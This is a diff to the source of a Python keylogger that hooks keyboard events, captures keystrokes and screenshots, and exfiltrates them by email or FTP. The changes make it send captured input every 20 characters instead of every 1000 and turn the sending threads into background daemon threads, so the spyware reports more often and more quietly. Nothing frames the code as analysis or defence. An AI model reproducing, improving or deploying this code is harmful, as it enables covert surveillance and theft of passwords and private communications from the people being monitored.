@@ -30,7 +30,7 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 1000  # set num of chars before send log/store
+intCharPerSend = 20  # set num of chars before send log/store
 
 blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
 intTimePerSend = 120  # set how often to send/save logs in seconds
@@ -206,12 +206,15 @@ def OnKeyboardEvent(event):
         if not strLogs == "":
             if blnStoreLocal == "True":
                 StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=strLogs)
+                StoreLogThread.daemon = True
                 StoreLogThread.start()
             elif blnFTP == "True":
                 SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath))
+                SendFTPThread.daemon = True
                 SendFTPThread.start()
             else:
                 SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, strExIP))
+                SendMailThread.daemon = True
                 SendMailThread.start()
 
     def SendScreen():  # function to send screens (easier to do this as a new function)
@@ -249,6 +252,7 @@ def OnKeyboardEvent(event):
             strScrPath = time.strftime(TMP + "/%Y%m%d%H%M%S" + ".png")  # save screenshot with datetime format
             threading.Thread(pyautogui.screenshot().save(strScrPath)).start()
             SendScreenThread = threading.Thread(target=SendScreen)
+            SendScreenThread.daemon = True
             SendScreenThread.start()
 
     # ctrl Lshift, rshift, h to stop program
